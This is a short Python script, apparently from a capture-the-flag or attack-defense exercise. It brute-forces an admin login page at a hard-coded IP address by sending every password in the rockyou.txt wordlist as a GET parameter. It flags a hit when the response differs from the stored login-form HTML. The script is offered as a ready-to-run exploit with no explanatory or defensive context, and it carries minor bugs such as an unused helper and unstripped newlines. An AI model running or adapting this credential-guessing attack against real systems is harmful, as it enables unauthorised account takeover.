import socket
import requests
import string
import random
import re


def GenTextByLength(length):
    flag = []
    alphabet = string.ascii_letters + string.digits
    if length < 62:
        for letter in alphabet:
            flag.append(letter)
        random.shuffle(flag)
        return ''.join(flag[:length])


def exploit():
    login = 'admin'
    content = b'\n    <!DOCTYPE html>\n    <html lang="en">\n    <head>\n        <meta charset="UTF-8">\n        <title>Admin-panel</title>\n    </head>\n    <body>\n        <form action="">\n            <p>\n                <label for="login">Login</label>\n                <input id="login" type="text" name="login">\n            </p>\n            <p>\n                <label for="password">Password</label>\n                <input id="password" type="password" name="password">\n            </p>\n            <input type="submit">\n        </form>\n    </body>\n    </html>\n    '
    s = requests.Session()
    with open('rockyou.txt') as f:
        for password in f:
            print(password)

            r = s.get('http://5.1.53.42:5003/admin?login={}&password={}'.format(login, password))
            if r.content != content:
                print('Логин: admin | Пароль: {}'.format(password))


if __name__ == '__main__':
    exploit()
